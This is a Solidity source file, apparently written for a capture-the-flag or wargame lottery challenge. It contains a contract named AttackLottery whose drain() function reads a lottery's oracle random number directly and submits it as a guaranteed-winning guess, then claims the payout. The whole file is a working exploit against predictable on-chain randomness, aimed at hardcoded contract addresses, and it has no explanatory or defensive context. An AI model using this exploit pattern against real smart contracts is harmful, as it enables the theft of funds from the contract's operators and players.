// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

interface ILottery {
    function registerTeam(
        address _walletAddress,
        string calldata _teamName,
        string calldata _password
    ) external payable;

    function makeAGuess(address _team, uint256 _guess) external returns (bool);

    function payoutWinningTeam(address _team) external returns (bool);
}

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

contract AttackLottery {
    address lo = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
    address or = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;

    function drain() public payable {
        ILottery(lo).registerTeam{value: 1_000_000_000}(
            msg.sender,
            "mokaiko",
            "mokaiko"
        );
        ILottery(lo).makeAGuess(msg.sender, IOracle(or).getRandomNumber());
        ILottery(lo).payoutWinningTeam(msg.sender);
    }
}
